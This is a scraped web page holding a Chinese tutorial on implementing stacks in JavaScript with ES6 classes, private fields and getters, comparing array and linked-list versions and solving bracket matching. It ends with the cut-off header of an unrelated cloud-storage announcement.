            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/793223472877051/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    神秘的猪头
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:37:06.000Z" title="Thu Nov 27 2025 06:37:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、什么是栈？🤔</h2>
<p><strong>栈</strong>（Stack）是一种经典的<strong>线性数据结构</strong>，其核心特性是 <strong>“先进后出”</strong> （Last In First Out, LIFO）。<br/>
你可以把它想象成一摞盘子🍽️：每次只能从顶部放入或取出盘子，最晚放进去的盘子最先被拿出来。</p>
<p>在计算机科学中，栈广泛应用于以下场景：</p>
<ul>
<li>🔁 函数调用（调用栈）</li>
<li>🧮 表达式求值与转换（如中缀转后缀）</li>
<li>✅ 括号匹配验证</li>
<li>🖥️ 浏览器前进/后退历史</li>
<li>🔄 撤销（Undo）操作</li>
</ul>
<blockquote>
<p>💡 栈的核心思想：<strong>只操作一端（栈顶），另一端封闭</strong>。</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">二、栈的抽象数据类型（ADT）🧩</h2>
<p>一个标准的栈应具备以下<strong>属性和方法</strong>：</p>

































<table><thead><tr><th>方法 / 属性</th><th>说明</th></tr></thead><tbody><tr><td><code>push(item)</code></td><td>➕ 入栈：将元素压入栈顶</td></tr><tr><td><code>pop()</code></td><td>➖ 出栈：移除并返回栈顶元素</td></tr><tr><td><code>peek()</code> / <code>top()</code></td><td>👀 查看栈顶元素但不移除</td></tr><tr><td><code>isEmpty()</code></td><td>❓ 判断栈是否为空</td></tr><tr><td><code>size</code></td><td>🔢 获取栈中元素数量</td></tr><tr><td><code>toArray()</code>（可选）</td><td>📤 将栈内容转为数组（用于调试或展示）</td></tr></tbody></table>
<blockquote>
<p>⚠️ <strong>注意</strong>：栈不允许随机访问中间元素，<strong>只能操作栈顶</strong>！</p>
</blockquote>
<hr/>
<h2 data-id="heading-2">三、ES6 Class 与栈的封装 🛠️</h2>
<p>ES6 引入了 <code>class</code> 语法，使面向对象编程更清晰。结合私有字段（<code>#</code>）、<code>get/set</code> 访问器等新特性，我们可以优雅地实现栈。</p>
<p>下面深入解析这些关键特性👇：</p>
<hr/>
<h3 data-id="heading-3">1️⃣ <code>class</code>：定义类的模板 📐</h3>
<p>在 ES6 之前，JavaScript 通过<strong>构造函数 + 原型链</strong>模拟类：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 🕰️ ES5 风格</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}
<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Hello, '</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
};
</code></pre>
<p>ES6 的 <code>class</code> 是对上述模式的<strong>语法糖</strong>，但结构更清晰、更接近传统 OOP：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ✨ ES6 class</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Hello, '</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
  }
}
</code></pre>
<p>✅ <strong>关键点</strong>：</p>
<ul>
<li>底层仍基于 <strong>原型</strong>（prototype）</li>
<li>提供<strong>声明式、结构化</strong>的代码组织方式</li>
<li>显著提升<strong>可读性与可维护性</strong>，尤其适合大型项目</li>
</ul>
<hr/>
<h3 data-id="heading-4">2️⃣ <code>#privateField</code>：私有属性 🔒</h3>
<p>传统 JS 中所有属性都是公开的，容易被外部篡改：</p>
<pre><code class="hljs language-ini" lang="ini">class Counter {
  constructor() {
    <span class="hljs-attr">this.count</span> = <span class="hljs-number">0</span><span class="hljs-comment">; // 😱 外部可随意修改！</span>
  }
}
const <span class="hljs-attr">c</span> = new Counter()<span class="hljs-comment">;</span>
<span class="hljs-attr">c.count</span> = <span class="hljs-number">999</span><span class="hljs-comment">; // 破坏封装！</span>
</code></pre>
<p>ES2022 引入 <strong>私有字段</strong>（以 <code>#</code> 开头），仅限类内部访问：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
  #count = <span class="hljs-number">0</span>; <span class="hljs-comment">// 🔒 私有属性</span>

  <span class="hljs-title function_">increment</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">this</span>.#count++; }
  <span class="hljs-title function_">getCount</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.#count; } <span class="hljs-comment">// ✅ 安全暴露</span>
}

<span class="hljs-keyword">const</span> c = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
c.<span class="hljs-title function_">increment</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(c.<span class="hljs-title function_">getCount</span>()); <span class="hljs-comment">// 1</span>

<span class="hljs-comment">// c.#count; // ❌ SyntaxError!</span>
</code></pre>
<p>✅ <strong>优势</strong>：</p>
<ul>
<li><strong>封装性</strong>：隐藏实现细节</li>
<li><strong>安全性</strong>：防止外部误操作</li>
<li><strong>可维护性</strong>：内部逻辑变更不影响外部调用</li>
</ul>
<blockquote>
<p>⚠️ 私有字段必须<strong>显式声明</strong>，不能动态添加。</p>
</blockquote>
<hr/>
<h3 data-id="heading-5">3️⃣ <code>constructor()</code>：初始化实例 🧬</h3>
<p><code>constructor</code> 是类的构造函数，在 <code>new</code> 实例时自动调用：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Stack</span> {
  #items;
  <span class="hljs-keyword">constructor</span>(initialItems = []) {
    <span class="hljs-keyword">this</span>.#items = [...initialItems]; <span class="hljs-comment">// 初始化私有数组</span>
  }
}
</code></pre>
<p>✅ <strong>作用</strong>：</p>
<ul>
<li>初始化实例属性（包括私有属性）</li>
<li>接收参数设置初始状态</li>
<li>若未定义，JS 会提供空默认构造函数</li>
</ul>
<p>🔁 <strong>注意</strong>：每个类<strong>最多只能有一个</strong> <code>constructor</code>。</p>
<hr/>
<h3 data-id="heading-6">4️⃣ <code>get size()</code>：只读属性访问器 📏</h3>
<p>有时我们希望暴露某个值，但<strong>禁止修改</strong>。这时可用 <code>get</code> 定义访问器：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayStack</span> {
  <span class="hljs-meta">#stack = [];</span>
  <span class="hljs-function">get <span class="hljs-title">size</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.<span class="hljs-meta">#stack.length; <span class="hljs-comment">// 📊 像读属性一样使用</span></span>
  }
}

<span class="hljs-type">const</span> stack = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayStack</span>();
console.<span class="hljs-built_in">log</span>(stack.size); <span class="hljs-comment">// 0</span>
<span class="hljs-comment">// stack.size = 10; // ❌ 无效（严格模式报错）</span>
</code></pre>
<p>✅ <strong>好处</strong>：</p>
<ul>
<li>语义清晰：<code>size</code> 看似属性，实为计算值</li>
<li>可加入校验、日志、缓存等逻辑</li>
<li>实现<strong>只读接口</strong>，避免误写</li>
</ul>
<p>💡 同理，<code>set</code> 可拦截赋值：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">set</span> <span class="hljs-title function_">maxSize</span>(<span class="hljs-params">value</span>) {
  <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'maxSize 不能为负'</span>);
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">_maxSize</span> = value;
}
</code></pre>
<hr/>
<h3 data-id="heading-7">5️⃣ 方法共享于原型链，节省内存 🧠</h3>
<p>这是 <code>class</code> 最重要的性能优势！</p>
<p>所有实例方法（非静态、非箭头函数）都定义在<strong>类的原型</strong>上：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Stack</span> {
  <span class="hljs-title function_">push</span>(<span class="hljs-params"/>) { <span class="hljs-comment">/* ... */</span> }
  <span class="hljs-title function_">pop</span>(<span class="hljs-params"/>) { <span class="hljs-comment">/* ... */</span> }
}

<span class="hljs-keyword">const</span> s1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Stack</span>();
<span class="hljs-keyword">const</span> s2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Stack</span>();

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(s1.<span class="hljs-property">push</span> === s2.<span class="hljs-property">push</span>); <span class="hljs-comment">// ✅ true！</span>
</code></pre>
<p>✅ <strong>这意味着</strong>：</p>
<ul>
<li>方法<strong>只在内存中存在一份</strong></li>
<li>所有实例通过原型链<strong>共享</strong>方法</li>
<li>极大节省内存，尤其适合创建大量对象（如游戏实体、UI 组件）</li>
</ul>
<p>❌ 对比反模式（ES5 常见陷阱）：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">BadStack</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">push</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-comment">/* 每次 new 都新建函数！*/</span> };
}
</code></pre>
<blockquote>
<p>📌 <strong>建议</strong>：现代项目优先使用 ES6+ <code>class</code>，善用私有字段与访问器，构建高内聚、低耦合的组件。</p>
</blockquote>
<hr/>
<h2 data-id="heading-8">四、两种实现方式：数组 vs 链表 ⚖️</h2>
<p>栈可以用<strong>数组</strong>或<strong>链表</strong>实现，各有优劣：</p>
<hr/>
<h3 data-id="heading-9">1️⃣ 基于数组的栈（ArrayStack）📦</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayStack</span> {
  #stack = [];
  <span class="hljs-keyword">get</span> size() { <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.#stack.length; }
  isEmpty() { <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.size === <span class="hljs-number">0</span>; }
  push(num) { <span class="hljs-keyword">this</span>.#stack.push(num); }
  pop() {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.isEmpty()) <span class="hljs-keyword">throw</span> new Error(<span class="hljs-string">'栈为空'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.#stack.pop();
  }
  peek() {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.isEmpty()) <span class="hljs-keyword">throw</span> new Error(<span class="hljs-string">'栈为空'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.#stack[<span class="hljs-keyword">this</span>.size - <span class="hljs-number">1</span>];
  }
  toArray() { <span class="hljs-keyword">return</span> [...<span class="hljs-keyword">this</span>.#stack]; }
}
</code></pre>
<h4 data-id="heading-10">✅ 优点：</h4>
<ul>
<li><strong>时间效率高</strong>：<code>push</code>/<code>pop</code> 在尾部操作，平均 <strong>O(1)</strong></li>
<li>内存连续，<strong>缓存友好</strong>（CPU 更快访问）</li>
<li>代码简洁，JS 数组原生支持</li>
</ul>
<h4 data-id="heading-11">❌ 缺点：</h4>
<ul>
<li><strong>扩容成本高</strong>：容量不足时需复制所有元素 → <strong>O(n)</strong></li>
<li>可能存在<strong>空间浪费</strong>（预分配未用完）</li>
</ul>
<blockquote>
<p>💡 实际中，扩容是<strong>低频事件</strong>，<strong>均摊时间复杂度仍为 O(1)</strong> 。</p>
</blockquote>
<hr/>
<h3 data-id="heading-12">2️⃣ 基于链表的栈（LinkedListStack）⛓️</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ListNode</span> {
  <span class="hljs-keyword">constructor</span>(<span class="hljs-keyword">val</span>) {
    <span class="hljs-keyword">this</span>.<span class="hljs-keyword">val</span> = <span class="hljs-keyword">val</span>;
    <span class="hljs-keyword">this</span>.next = <span class="hljs-literal">null</span>;
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">LinkedListStack</span> {
  #stackPeek = <span class="hljs-literal">null</span>;
  #size = <span class="hljs-number">0</span>;

  <span class="hljs-keyword">get</span> size() { <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.#size; }
  isEmpty() { <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.size === <span class="hljs-number">0</span>; }

  push(num) {
    <span class="hljs-keyword">const</span> node = new ListNode(num);
    node.next = <span class="hljs-keyword">this</span>.#stackPeek;
    <span class="hljs-keyword">this</span>.#stackPeek = node;
    <span class="hljs-keyword">this</span>.#size++;
  }

  peek() {
    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.#stackPeek) <span class="hljs-keyword">throw</span> new Error(<span class="hljs-string">'栈为空'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.#stackPeek.<span class="hljs-keyword">val</span>;
  }

  pop() {
    <span class="hljs-keyword">const</span> num = <span class="hljs-keyword">this</span>.peek();
    <span class="hljs-keyword">this</span>.#stackPeek = <span class="hljs-keyword">this</span>.#stackPeek.next;
    <span class="hljs-keyword">this</span>.#size--;
    <span class="hljs-keyword">return</span> num;
  }

  toArray() {
    <span class="hljs-keyword">const</span> arr = new Array(<span class="hljs-keyword">this</span>.size);
    let node = <span class="hljs-keyword">this</span>.#stackPeek;
    let i = <span class="hljs-keyword">this</span>.size - <span class="hljs-number">1</span>;
    <span class="hljs-keyword">while</span> (node) {
      arr[i--] = node.<span class="hljs-keyword">val</span>;
      node = node.next;
    }
    <span class="hljs-keyword">return</span> arr;
  }
}
</code></pre>
<h4 data-id="heading-13">✅ 优点：</h4>
<ul>
<li><strong>动态扩容</strong>：每次插入只需 <strong>O(1)</strong> ，无复制开销</li>
<li>空间按需分配，<strong>无浪费</strong></li>
</ul>
<h4 data-id="heading-14">❌ 缺点：</h4>
<ul>
<li>每个节点需额外存储 <code>next</code> 指针 → <strong>内存开销更大</strong></li>
<li>节点在内存中<strong>离散分布</strong> → 缓存局部性差</li>
<li>实例化 <code>ListNode</code> 有一定性能损耗</li>
</ul>
<blockquote>
<p>✅ <strong>总结</strong>：</p>
<ul>
<li>🚀 日常开发、轻量场景 → <strong>数组实现</strong></li>
<li>🏗️ 大数据、稳定性要求高 → <strong>链表实现</strong></li>
</ul>
</blockquote>
<hr/>
<h2 data-id="heading-15">五、实战应用：有效的括号匹配 ✅</h2>
<p>栈的经典应用场景之一！</p>
<h3 data-id="heading-16">📌 问题描述：</h3>
<p>给定字符串 <code>s</code>，仅含 <code>'('</code>, <code>')'</code>, <code>'['</code>, <code>']'</code>, <code>'{'</code>, <code>'}'</code>，判断是否有效：</p>
<ul>
<li>左右括号必须正确闭合</li>
<li>顺序必须匹配（如 <code>"([)]"</code> ❌ 无效）</li>
</ul>
<h3 data-id="heading-17">🧠 解题思路：</h3>
<ol>
<li>遇到<strong>左括号</strong> → 将其对应的<strong>右括号</strong>压入栈</li>
<li>遇到<strong>右括号</strong> → 检查是否与栈顶匹配</li>
<li>遍历结束 → 栈必须为空</li>
</ol>
<h3 data-id="heading-18">💻 代码实现：</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> leftToRight = {
  <span class="hljs-string">"("</span>: <span class="hljs-string">")"</span>,
  <span class="hljs-string">"["</span>: <span class="hljs-string">"]"</span>,
  <span class="hljs-string">"{"</span>: <span class="hljs-string">"}"</span>,
};

<span class="hljs-function">function <span class="hljs-title">isValid</span><span class="hljs-params">(s)</span> </span>{
  <span class="hljs-keyword">if</span> (!s) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  <span class="hljs-type">const</span> stack = [];
  <span class="hljs-keyword">for</span> (let ch of s) {
    <span class="hljs-keyword">if</span> (ch in leftToRight) {
      stack.<span class="hljs-built_in">push</span>(leftToRight[ch]); <span class="hljs-comment">// 压入期望的右括号</span>
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">if</span> (!stack.length || stack.<span class="hljs-built_in">pop</span>() !== ch) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// 不匹配或栈空</span>
      }
    }
  }
  <span class="hljs-keyword">return</span> stack.length === <span class="hljs-number">0</span>; <span class="hljs-comment">// 栈空则有效</span>
}
</code></pre>
<p>🧪 <strong>测试</strong>：</p>
<pre><code class="hljs language-arduino" lang="arduino">console.<span class="hljs-built_in">log</span>(<span class="hljs-built_in">isValid</span>(<span class="hljs-string">"()"</span>));       <span class="hljs-comment">// ✅ true</span>
console.<span class="hljs-built_in">log</span>(<span class="hljs-built_in">isValid</span>(<span class="hljs-string">"()[]{}"</span>));   <span class="hljs-comment">// ✅ true</span>
console.<span class="hljs-built_in">log</span>(<span class="hljs-built_in">isValid</span>(<span class="hljs-string">"(]"</span>));       <span class="hljs-comment">// ❌ false</span>
console.<span class="hljs-built_in">log</span>(<span class="hljs-built_in">isValid</span>(<span class="hljs-string">"([)]"</span>));     <span class="hljs-comment">// ❌ false</span>
console.<span class="hljs-built_in">log</span>(<span class="hljs-built_in">isValid</span>(<span class="hljs-string">"{[]}"</span>));     <span class="hljs-comment">// ✅ true</span>
</code></pre>
<blockquote>
<p>🔍 <strong>为什么压入“右括号”？</strong><br/>
这样遇到右括号时可直接比较 <code>stack.pop() === ch</code>，<strong>无需二次查表</strong>，逻辑更简洁高效！</p>
</blockquote>
<hr/>
<h2 data-id="heading-19">六、总结对比 📊</h2>



































<table><thead><tr><th>维度</th><th>数组栈 📦</th><th>链表栈 ⛓️</th></tr></thead><tbody><tr><td>时间复杂度（平均）</td><td>O(1)</td><td>O(1)</td></tr><tr><td>扩容开销</td><td>O(n)（低频）</td><td>O(1)</td></tr><tr><td>空间效率</td><td>可能浪费</td><td>指针开销（约 +50%）</td></tr><tr><td>实现难度</td><td>⭐ 简单</td><td>⭐⭐ 中等</td></tr><tr><td>适用场景</td><td>通用、轻量级</td><td>大数据、稳定性要求高</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-20">🎯 结语</h2>
<p>栈虽简单，却是理解程序运行机制（如调用栈）和解决算法问题（DFS、表达式解析、回溯）的<strong>基石数据结构</strong>。</p>
<p>掌握其两种实现方式及典型应用，不仅能写出更高效的代码，还能在面试中展现扎实的基本功！</p>
<blockquote>
<p>📌 <strong>终极建议</strong>：</p>
<ul>
<li>日常开发 → 优先用 <strong>数组实现</strong>（简单高效）</li>
<li>面试/性能敏感场景 → 主动讨论 <strong>链表方案</strong>，展现深度思考 💡</li>
</ul>
</blockquote>
<hr/>
<p>📚 <strong>延伸思考</strong>：你能用栈实现“浏览器后退”功能吗？或者用两个栈实现一个队列？欢迎动手尝试！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[全球前四！京东云云海AI存储跻身IO500高性能存储榜单]]></title>    <link>https://juejin.cn/post/7576955345379082303</link>    <guid>https://juejin.cn/post/7576955345379082303</guid>    <pubDate>2025-11-27T06:40:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576955345379082303" data-draft-id="7577042851079864363" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="全球前四！京东云云海AI存储跻身IO500高性能存储榜单"/> <meta itemprop="keywords" content="程序员"/> <meta itemprop="datePublished" content="2025-11-27T06:40:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="京东云开发者"/> <meta itemprop="url" content="https://juejin.cn/user/2634854380340008"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            全球前四！京东云云海AI存储跻身IO500高性能存储榜单
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2634854380340008/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    京东云开发者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:40:05.000Z" title="Thu Nov 27 2025 06:40:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 